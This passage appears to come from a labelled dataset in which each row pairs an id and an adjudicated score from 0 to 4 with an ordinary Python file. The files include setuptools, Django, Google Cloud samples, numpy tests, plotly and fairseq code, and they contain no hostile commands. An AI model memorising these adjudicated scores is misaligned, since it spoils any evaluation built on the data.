        bdist_wheel.egg2dist(egg_info.egg_info, dist_info_dir)


def _safe(component: str) -> str:
    """"""Escape a component used to form a wheel name according to PEP 491""""""
    return re.sub(r""[^\w\d.]+"", ""_"", component)


def _version(version: str) -> str:
    """"""Convert an arbitrary string to a version string.""""""
    v = version.replace(' ', '.')
    try:
        return str(packaging.version.Version(v)).replace(""-"", ""_"")
    except packaging.version.InvalidVersion:
        msg = f""""""Invalid version: {version!r}.
        !!\n\n
        ###################
        # Invalid version #
        ###################
        {version!r} is not valid according to PEP 440.\n
        Please make sure specify a valid version for your package.
        Also note that future releases of setuptools may halt the build process
        if an invalid version is given.
        \n\n!!
        """"""
        warnings.warn(cleandoc(msg))
        return _safe(v).strip(""_"")"
383	adjudicated	1	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):

    description = ""install scripts (Python or otherwise)""

    user_options = [
        ('install-dir=', 'd', ""directory to install scripts to""),
        ('build-dir=', 'b', ""build directory (where to install from)""),
        ('force', 'f', ""force installation (overwrite existing files)""),
        ('skip-build', None, ""skip the build steps""),
    ]

    boolean_options = ['force', 'skip-build']

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options('build', ('build_scripts', 'build_dir'))
        self.set_undefined_options(
            'install',
            ('install_scripts', 'install_dir'),
            ('force', 'force'),
            ('skip_build', 'skip_build'),
        )

    def run(self):
        if not self.skip_build:
            self.run_command('build_scripts')
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == 'posix':
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
230	adjudicated	0	"import openai
import spacy
from translate import Translator
from app.ai.WolframeAlpha import WolframAlpha
from app.models.MongoDb import get_openai_key,get_wolframalpha_key

class MicroAI:
    def __init__(self, api_key):
        self.api_key = api_key
        self.nlp = spacy.load(""en_core_web_sm"")

    def get_engine(self, question):
        doc = self.nlp(question)
        if any(token.text.lower() in ['classify', 'categorize', 'group'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['summarize', 'brief', 'short'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['translate', 'conversion'] for token in doc):
            return ""text-davinci-002""
        elif any(token.text.lower() in ['solve', 'calculate', 'compute'] for token in doc):
            return ""text-davinci-003""
        elif any(token.text.lower() in ['create', 'build', 'design', 'generate'] for token in doc):
            return ""davinci-codex""
        else:
            return ""text-davinci-002""

    def generate_answer(self, question):
        wolfram = WolframAlpha(app_id=get_wolframalpha_key())
        answer = wolfram.answer_question(question=question)
        if ""Lá»i: "" in answer:
            translator = Translator(to_lang='en', from_lang='vi')
            question_en = translator.translate(question)
            engine = self.get_engine(question_en)

            openai.api_key = self.api_key
            completions = openai.Completion.create(
                engine=engine,
                prompt=question_en,
                max_tokens=1024,
                n=1,
                stop=None,
                temperature=0.5,
            )
            message = completions.choices[0].text

            result = {'engine': engine, 'question': question, 'answer': message}
            return result
        else:
            result = {'engine': 'WolframAlpha', 'question': question, 'answer': answer}
            return result"
370	adjudicated	2	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import re
import uuid

from google.cloud import iam_v2
from google.cloud.iam_v2 import types
import pytest
from snippets.create_deny_policy import create_deny_policy
from snippets.delete_deny_policy import delete_deny_policy

PROJECT_ID = os.environ[""IAM_PROJECT_ID""]
GOOGLE_APPLICATION_CREDENTIALS = os.environ[""IAM_CREDENTIALS""]


@pytest.fixture
def deny_policy(capsys: ""pytest.CaptureFixture[str]"") -> None:
    policy_id = f""test-deny-policy-{uuid.uuid4()}""

    # Delete any existing policies. Otherwise it might throw quota issue.
    delete_existing_deny_policies(PROJECT_ID, ""test-deny-policy"")

    # Create the Deny policy.
    create_deny_policy(PROJECT_ID, policy_id)

    yield policy_id

    # Delete the Deny policy and assert if deleted.
    delete_deny_policy(PROJECT_ID, policy_id)
    out, _ = capsys.readouterr()
    assert re.search(f""Deleted the deny policy: {policy_id}"", out)


def delete_existing_deny_policies(project_id: str, delete_name_prefix: str) -> None:
    policies_client = iam_v2.PoliciesClient()

    attachment_point = f""cloudresourcemanager.googleapis.com%2Fprojects%2F{project_id}""

    request = types.ListPoliciesRequest()
    request.parent = f""policies/{attachment_point}/denypolicies""
    for policy in policies_client.list_policies(request=request):
        if delete_name_prefix in policy.name:
            delete_deny_policy(PROJECT_ID, str(policy.name).rsplit(""/"", 1)[-1])"
261	adjudicated	0	"from django.contrib.auth.forms import UserCreationForm
from django import forms
from django.contrib.auth.models import User
from .models import Post

class RegisterForm(UserCreationForm):
    email = forms.EmailField(label = ""Email"")
    firstname = forms.CharField(label = ""First name"")
    lastname = forms.CharField(label = ""Last name"")

    class Meta:
        model = User
        fields = (""username"", ""firstname"", ""lastname"", ""email"", )

    def save(self, commit=True):
        user = super(RegisterForm, self).save(commit=False)
        firstname = self.cleaned_data[""firstname""]
        lastname = self.cleaned_data[""lastname""]
        user.first_name = firstname
        user.last_name = lastname
        user.email = self.cleaned_data[""email""]
        if commit:
            user.save()
        return user
    
class PostForm(forms.ModelForm):
    text = forms.CharField(max_length=1000, widget=forms.Textarea(attrs={'placeholder': 'What\'s on your mind?', 'onchange': 'character_count()', 'onkeypress': 'character_count()', 'onfocus': 'character_count()' ,'oninput': 'character_count()', 'onkeyup':'character_count()','onpaste':'character_count()'}))
    images = forms.ImageField(required=False,widget=forms.ClearableFileInput(attrs={'multiple': True, 'onchange': 'previewImages(this)'}))
    class Meta:
        model = Post
        fields = (""text"", )

class SearchForm(forms.Form):
    search = forms.CharField(max_length=100, widget=forms.TextInput(attrs={'placeholder': 'Type something or someone to search for ...'}))

class UpdateProfileForm(forms.Form):
    first_name = forms.CharField(max_length=100, required=False)
    last_name = forms.CharField(max_length=100, required=False)
    profile_image = forms.ImageField(required=False)
    remove_profile_image = forms.BooleanField(required=False)
    profile_cover_photo = forms.ImageField(required=False)
    remove_cover_photo = forms.BooleanField(required=False)
    profile_bio = forms.CharField(max_length=500, required=False, widget=forms.Textarea(attrs={'placeholder': 'Write something about yourself ...'}))"
321	adjudicated	3	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

from fairseq.optim import LegacyFairseqOptimizer, register_optimizer


@register_optimizer(""lamb"")
class FairseqLAMB(LegacyFairseqOptimizer):
    """"""LAMB optimizer.""""""

    def __init__(self, args, params):
        super().__init__(args)
        try:
            from apex.optimizers import FusedLAMB

            self._optimizer = FusedLAMB(params, **self.optimizer_config)
        except ImportError:
            raise ImportError(""Please install apex to use LAMB optimizer"")

    @staticmethod
    def add_args(parser):
        """"""Add optimizer-specific arguments to the parser.""""""
        # fmt: off
        parser.add_argument('--lamb-betas', default='(0.9, 0.999)', metavar='B',
                            help='betas for LAMB optimizer')
        parser.add_argument('--lamb-eps', type=float, default=1e-8, metavar='D',
                            help='epsilon for LAMB optimizer')
        parser.add_argument('--weight-decay', '--wd', default=0.0, type=float, metavar='WD',
                            help='weight decay')
        # fmt: on

    @property
    def optimizer_config(self):
        """"""
        Return a kwarg dictionary that will be used to override optimizer
        args stored in checkpoints. This allows us to load a checkpoint and
        resume training using a different set of optimizer args, e.g., with a
        different learning rate.
        """"""
        return {
            ""lr"": self.args.lr[0],
            ""betas"": eval(self.args.lamb_betas),
            ""eps"": self.args.lamb_eps,
            ""weight_decay"": self.args.weight_decay,
        }

    @property
    def supports_flat_params(self):
        return False"
330	adjudicated	0	"""""""Tests for the NumpyVersion class.

""""""
from numpy.testing import assert_, assert_raises
from numpy.lib import NumpyVersion


def test_main_versions():
    assert_(NumpyVersion('1.8.0') == '1.8.0')
    for ver in ['1.9.0', '2.0.0', '1.8.1', '10.0.1']:
        assert_(NumpyVersion('1.8.0') < ver)

    for ver in ['1.7.0', '1.7.1', '0.9.9']:
        assert_(NumpyVersion('1.8.0') > ver)


def test_version_1_point_10():
    # regression test for gh-2998.
    assert_(NumpyVersion('1.9.0') < '1.10.0')
    assert_(NumpyVersion('1.11.0') < '1.11.1')
    assert_(NumpyVersion('1.11.0') == '1.11.0')
    assert_(NumpyVersion('1.99.11') < '1.99.12')


def test_alpha_beta_rc():
    assert_(NumpyVersion('1.8.0rc1') == '1.8.0rc1')
    for ver in ['1.8.0', '1.8.0rc2']:
        assert_(NumpyVersion('1.8.0rc1') < ver)

    for ver in ['1.8.0a2', '1.8.0b3', '1.7.2rc4']:
        assert_(NumpyVersion('1.8.0rc1') > ver)

    assert_(NumpyVersion('1.8.0b1') > '1.8.0a2')


def test_dev_version():
    assert_(NumpyVersion('1.9.0.dev-Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev-ffffffff']:
        assert_(NumpyVersion('1.9.0.dev-f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev-f16acvda') == '1.9.0.dev-11111111')


def test_dev_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev-f16acvda') == '1.9.0a2.dev-11111111')
    assert_(NumpyVersion('1.9.0a2.dev-6acvda54') < '1.9.0a2')


def test_dev0_version():
    assert_(NumpyVersion('1.9.0.dev0+Unknown') < '1.9.0')
    for ver in ['1.9.0', '1.9.0a1', '1.9.0b2', '1.9.0b2.dev0+ffffffff']:
        assert_(NumpyVersion('1.9.0.dev0+f16acvda') < ver)

    assert_(NumpyVersion('1.9.0.dev0+f16acvda') == '1.9.0.dev0+11111111')


def test_dev0_a_b_rc_mixed():
    assert_(NumpyVersion('1.9.0a2.dev0+f16acvda') == '1.9.0a2.dev0+11111111')
    assert_(NumpyVersion('1.9.0a2.dev0+6acvda54') < '1.9.0a2')


def test_raises():
    for ver in ['1.9', '1,9.0', '1.7.x']:
        assert_raises(ValueError, NumpyVersion, ver)"
270	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""funnelarea.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
361	adjudicated	3	"#!/usr/bin/env python

# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START privateca_disable_ca]
import google.cloud.security.privateca_v1 as privateca_v1


def disable_certificate_authority(
    project_id: str, location: str, ca_pool_name: str, ca_name: str
) -> None:
    """"""
    Disable a Certificate Authority which is present in the given CA pool.

    Args:
        project_id: project ID or project number of the Cloud project you want to use.
        location: location you want to use. For a list of locations, see: https://cloud.google.com/certificate-authority-service/docs/locations.
        ca_pool_name: the name of the CA pool under which the CA is present.
        ca_name: the name of the CA to be disabled.
    """"""

    caServiceClient = privateca_v1.CertificateAuthorityServiceClient()
    ca_path = caServiceClient.certificate_authority_path(
        project_id, location, ca_pool_name, ca_name
    )

    # Create the Disable Certificate Authority Request.
    request = privateca_v1.DisableCertificateAuthorityRequest(name=ca_path)

    # Disable the Certificate Authority.
    operation = caServiceClient.disable_certificate_authority(request=request)
    result = operation.result()

    print(""Operation result:"", result)

    # Get the current CA state.
    ca_state = caServiceClient.get_certificate_authority(name=ca_path).state

    # Check if the CA is disabled.
    if ca_state == privateca_v1.CertificateAuthority.State.DISABLED:
        print(""Disabled Certificate Authority:"", ca_name)
    else:
        print(""Cannot disable the Certificate Authority ! Current CA State:"", ca_state)


# [END privateca_disable_ca]"
221	adjudicated	0	"from viktor._vendor import libcst

from viktor._vendor.libcst import matchers as m

from viktor._codemod.helpers import match_controller_class


class Visitor(libcst.CSTVisitor):
    pass


class Transformer(libcst.CSTTransformer):

    def __init__(self, visitor):
        super().__init__()

        self.OptionField_ImportAlias = None

    def leave_ImportAlias_asname(self, node) -> None:
        if node.name.value == ""OptionField"":
            if node.asname:
                self.OptionField_ImportAlias = node.asname.name.value

    def leave_ClassDef(self, original_node, updated_node):

        if not match_controller_class(original_node):
            return updated_node

        body = updated_node.body
        new_statements = []
        for statement in body.body:
            if m.matches(statement, m.SimpleStatementLine()):
                try:
                    target = statement.body[0].targets[0].target
                    if target.value.startswith('viktor_'):
                        continue
                except AttributeError:  # 'targets' not present
                    pass

            new_statements.append(statement)

        body = body.with_changes(body=new_statements)

        return updated_node.with_changes(body=body)

    def leave_Call(self, node, updated_node):

        try:
            if node.func.value not in (self.OptionField_ImportAlias, ""OptionField""):
                return updated_node
        except AttributeError:  # func may not have 'value'
            return updated_node

        new_args = []
        for arg_index, arg in enumerate(node.args):

            if arg.keyword is not None:
                if arg.keyword.value == 'autoselect_single_option' and arg.value.value == 'False':
                    continue
            new_args.append(arg)

        new_args[-1] = new_args[-1].with_changes(comma=None)

        return updated_node.with_changes(args=new_args)"
3	adjudicated	2	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""funnelarea.title"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
392	adjudicated	1	"from django.core import checks

NOT_PROVIDED = object()


class FieldCacheMixin:
    """"""Provide an API for working with the model's fields value cache.""""""

    def get_cache_name(self):
        raise NotImplementedError

    def get_cached_value(self, instance, default=NOT_PROVIDED):
        cache_name = self.get_cache_name()
        try:
            return instance._state.fields_cache[cache_name]
        except KeyError:
            if default is NOT_PROVIDED:
                raise
            return default

    def is_cached(self, instance):
        return self.get_cache_name() in instance._state.fields_cache

    def set_cached_value(self, instance, value):
        instance._state.fields_cache[self.get_cache_name()] = value

    def delete_cached_value(self, instance):
        del instance._state.fields_cache[self.get_cache_name()]


class CheckFieldDefaultMixin:
    _default_hint = (""<valid default>"", ""<invalid default>"")

    def _check_default(self):
        if (
            self.has_default()
            and self.default is not None
            and not callable(self.default)
        ):
            return [
                checks.Warning(
                    ""%s default should be a callable instead of an instance ""
                    ""so that it's not shared between all field instances.""
                    % (self.__class__.__name__,),
                    hint=(
                        ""Use a callable instead, e.g., use `%s` instead of ""
                        ""`%s`."" % self._default_hint
                    ),
                    obj=self,
                    id=""fields.E010"",
                )
            ]
        else:
            return []

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_default())
        return errors"
143	adjudicated	0	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import os

import pytest

from tests.providers.google.cloud.utils.gcp_authenticator import GCP_DATASTORE_KEY
from tests.test_utils.gcp_system_helpers import CLOUD_DAG_FOLDER, GoogleSystemTest, provide_gcp_context

BUCKET = os.environ.get(""GCP_DATASTORE_BUCKET"", ""datastore-system-test"")


@pytest.mark.backend(""mysql"", ""postgres"")
@pytest.mark.credential_file(GCP_DATASTORE_KEY)
class TestGcpDatastoreSystem(GoogleSystemTest):
    @provide_gcp_context(GCP_DATASTORE_KEY)
    def setup_method(self):
        self.create_gcs_bucket(BUCKET, location=""europe-central2"")

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def teardown_method(self):
        self.delete_gcs_bucket(BUCKET)

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def test_run_example_dag(self):
        self.run_dag(""example_gcp_datastore"", CLOUD_DAG_FOLDER)

    @provide_gcp_context(GCP_DATASTORE_KEY)
    def test_run_example_dag_operations(self):
        self.run_dag(""example_gcp_datastore_operations"", CLOUD_DAG_FOLDER)"
52	adjudicated	4	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for creating an accessing a secret.
""""""


def quickstart(_project_id=None, _secret_id=None):
    # [START secretmanager_quickstart]
    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # GCP project in which to store secrets in Secret Manager.
    project_id = ""YOUR_PROJECT_ID""

    # ID of the secret to create.
    secret_id = ""YOUR_SECRET_ID""

    # [END secretmanager_quickstart]
    project_id = _project_id
    secret_id = _secret_id
    # [START secretmanager_quickstart]
    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the parent name from the project.
    parent = f""projects/{project_id}""

    # Create the parent secret.
    secret = client.create_secret(
        request={
            ""parent"": parent,
            ""secret_id"": secret_id,
            ""secret"": {""replication"": {""automatic"": {}}},
        }
    )

    # Add the secret version.
    version = client.add_secret_version(
        request={""parent"": secret.name, ""payload"": {""data"": b""hello world!""}}
    )

    # Access the secret version.
    response = client.access_secret_version(request={""name"": version.name})

    # Print the secret payload.
    #
    # WARNING: Do not print the secret in a production environment - this
    # snippet is showing how to access the secret material.
    payload = response.payload.data.decode(""UTF-8"")
    print(""Plaintext: {}"".format(payload))
    # [END secretmanager_quickstart]


if __name__ == ""__main__"":
    quickstart()"
112	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'l, j F, Y'
TIME_FORMAT = 'h:i a'
DATETIME_FORMAT = 'j F, Y h:i a'
YEAR_MONTH_FORMAT = 'F, Y'
MONTH_DAY_FORMAT = 'j F'
SHORT_DATE_FORMAT = 'j.M.Y'
SHORT_DATETIME_FORMAT = 'j.M.Y H:i'
FIRST_DAY_OF_WEEK = 1  # (Monday)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
# Kept ISO formats as they are in first position
DATE_INPUT_FORMATS = [
    '%Y-%m-%d', '%m/%d/%Y', '%m/%d/%y',     # '2006-10-25', '10/25/2006', '10/25/06'
    '%d.%m.%Y', '%d.%m.%y',                 # '25.10.2006', '25.10.06'
    # '%d %b %Y', '%d %b, %Y', '%d %b. %Y',   # '25 Oct 2006', '25 Oct, 2006', '25 Oct. 2006'
    # '%d %B %Y', '%d %B, %Y',                # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',     # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',  # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',        # '2006-10-25 14:30'
    '%d.%m.%Y %H:%M:%S',     # '25.10.2006 14:30:59'
    '%d.%m.%Y %H:%M:%S.%f',  # '25.10.2006 14:30:59.000200'
    '%d.%m.%Y %H:%M',        # '25.10.2006 14:30'
    '%d.%m.%y %H:%M:%S',     # '25.10.06 14:30:59'
    '%d.%m.%y %H:%M:%S.%f',  # '25.10.06 14:30:59.000200'
    '%d.%m.%y %H:%M',        # '25.10.06 14:30'
    '%m/%d/%Y %H:%M:%S',     # '10/25/2006 14:30:59'
    '%m/%d/%Y %H:%M:%S.%f',  # '10/25/2006 14:30:59.000200'
    '%m/%d/%Y %H:%M',        # '10/25/2006 14:30'
    '%m/%d/%y %H:%M:%S',     # '10/25/06 14:30:59'
    '%m/%d/%y %H:%M:%S.%f',  # '10/25/06 14:30:59.000200'
    '%m/%d/%y %H:%M',        # '10/25/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = "" ""
NUMBER_GROUPING = 3"
283	adjudicated	2	"alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

def caesar(start_text, shift_amount, cipher_direction):
  end_text = """"
  if cipher_direction == ""decode"":
    shift_amount *= -1
  for char in start_text:
    #TODO-3: What happens if the user enters a number/symbol/space?
    #Can you fix the code to keep the number/symbol/space when the text is encoded/decoded?
    #e.g. start_text = ""meet me at 3""
    #end_text = ""â¢â¢â¢â¢ â¢â¢ â¢â¢ 3""
    if char in alphabet:
      position = alphabet.index(char)
      new_position = position + shift_amount
      end_text += alphabet[new_position]
    else:
      end_text += char
  print(f""Here's the {cipher_direction}d result: {end_text}"")

#TODO-1: Import and print the logo from art.py when the program starts.
from art import logo
print(logo)

#TODO-4: Can you figure out a way to ask the user if they want to restart the cipher program?
#e.g. Type 'yes' if you want to go again. Otherwise type 'no'.
#If they type 'yes' then ask them for the direction/text/shift again and call the caesar() function again?
#Hint: Try creating a while loop that continues to execute the program if the user types 'yes'.
should_end = False
while not should_end:

  direction = input(""Type 'encode' to encrypt, type 'decode' to decrypt:\n"")
  text = input(""Type your message:\n"").lower()
  shift = int(input(""Type the shift number:\n""))
  #TODO-2: What if the user enters a shift that is greater than the number of letters in the alphabet?
  #Try running the program and entering a shift number of 45.
  #Add some code so that the program continues to work even if the user enters a shift number greater than 26. 
  #Hint: Think about how you can use the modulus (%).
  shift = shift % 26

  caesar(start_text=text, shift_amount=shift, cipher_direction=direction)

  restart = input(""Type 'yes' if you want to go again. Otherwise type 'no'.\n"")
  if restart == ""no"":
    should_end = True
    print(""Goodbye"")
    "
184	adjudicated	2	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


def batch_predict(project_id, model_id, input_uri, output_uri):
    """"""Batch predict""""""
    # [START automl_batch_predict]
    from google.cloud import automl

    # TODO(developer): Uncomment and set the following variables
    # project_id = ""YOUR_PROJECT_ID""
    # model_id = ""YOUR_MODEL_ID""
    # input_uri = ""gs://YOUR_BUCKET_ID/path/to/your/input/csv_or_jsonl""
    # output_uri = ""gs://YOUR_BUCKET_ID/path/to/save/results/""

    prediction_client = automl.PredictionServiceClient()

    # Get the full path of the model.
    model_full_id = f""projects/{project_id}/locations/us-central1/models/{model_id}""

    gcs_source = automl.GcsSource(input_uris=[input_uri])

    input_config = automl.BatchPredictInputConfig(gcs_source=gcs_source)
    gcs_destination = automl.GcsDestination(output_uri_prefix=output_uri)
    output_config = automl.BatchPredictOutputConfig(gcs_destination=gcs_destination)

    response = prediction_client.batch_predict(
        name=model_full_id, input_config=input_config, output_config=output_config
    )

    print(""Waiting for operation to complete..."")
    print(
        f""Batch Prediction results saved to Cloud Storage bucket. {response.result()}""
    )
    # [END automl_batch_predict]"
215	adjudicated	3	"""""""Stuff that differs in different Python versions and platform
distributions.""""""

import logging
import os
import sys

__all__ = [""get_path_uid"", ""stdlib_pkgs"", ""WINDOWS""]


logger = logging.getLogger(__name__)


def has_tls() -> bool:
    try:
        import _ssl  # noqa: F401  # ignore unused

        return True
    except ImportError:
        pass

    from pip._vendor.urllib3.util import IS_PYOPENSSL

    return IS_PYOPENSSL


def get_path_uid(path: str) -> int:
    """"""
    Return path's uid.

    Does not follow symlinks:
        https://github.com/pypa/pip/pull/935#discussion_r5307003

    Placed this function in compat due to differences on AIX and
    Jython, that should eventually go away.

    :raises OSError: When path is a symlink or can't be read.
    """"""
    if hasattr(os, ""O_NOFOLLOW""):
        fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW)
        file_uid = os.fstat(fd).st_uid
        os.close(fd)
    else:  # AIX and Jython
        # WARNING: time of check vulnerability, but best we can do w/o NOFOLLOW
        if not os.path.islink(path):
            # older versions of Jython don't have `os.fstat`
            file_uid = os.stat(path).st_uid
        else:
            # raise OSError for parity with os.O_NOFOLLOW above
            raise OSError(f""{path} is a symlink; Will not return uid for symlinks"")
    return file_uid


# packages in the stdlib that may have installation metadata, but should not be
# considered 'installed'.  this theoretically could be determined based on
# dist.location (py27:`sysconfig.get_paths()['stdlib']`,
# py26:sysconfig.get_config_vars('LIBDEST')), but fear platform variation may
# make this ineffective, so hard-coding
stdlib_pkgs = {""python"", ""wsgiref"", ""argparse""}


# windows detection, covers cpython and ironpython
WINDOWS = sys.platform.startswith(""win"") or (sys.platform == ""cli"" and os.name == ""nt"")"
355	adjudicated	2	"import lightly.data as data

# the collate function applies random transforms to the input images
collate_fn = data.ImageCollateFunction(input_size=32, cj_prob=0.5)
import torch

# create a dataset from your image folder
dataset = data.LightlyDataset(input_dir='./my/cute/cats/dataset/')

# build a PyTorch dataloader
dataloader = torch.utils.data.DataLoader(
    dataset,                # pass the dataset to the dataloader
    batch_size=128,         # a large batch size helps with the learning
    shuffle=True,           # shuffling is important!
    collate_fn=collate_fn)  # apply transformations to the input images
import torchvision

from lightly.loss import NTXentLoss
from lightly.models.modules.heads import SimCLRProjectionHead

# use a resnet backbone
resnet = torchvision.models.resnext101_64x4d()  # or efficientnet0_b0
resnet = torch.nn.Sequential(*list(resnet.children())[:-1])

# build a SimCLR model
class SimCLR(torch.nn.Module):
    def __init__(self, backbone, hidden_dim, out_dim):
        super().__init__()
        self.backbone = backbone
        self.projection_head = SimCLRProjectionHead(hidden_dim, hidden_dim, out_dim)

    def forward(self, x):
        h = self.backbone(x).flatten(start_dim=1)
        z = self.projection_head(h)
        return z

model = SimCLR(resnet, hidden_dim=512, out_dim=128)

# use a criterion for self-supervised learning
# (normalized temperature-scaled cross entropy loss)
criterion = NTXentLoss(temperature=0.5)

# get a PyTorch optimizer
optimizer = torch.optim.SGD(model.parameters(), lr=1e-0, weight_decay=1e-5)
device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
max_epochs = 10
for epoch in range(max_epochs):
    for (x0, x1), _, _ in dataloader:

        x0 = x0.to(device)
        x1 = x1.to(device)

        z0 = model(x0)
        z1 = model(x1)

        loss = criterion(z0, z1)
        loss.backward()

        optimizer.step()
        optimizer.zero_grad()"
244	adjudicated	2	"import os
import json

import torch
from PIL import Image
from torchvision import transforms
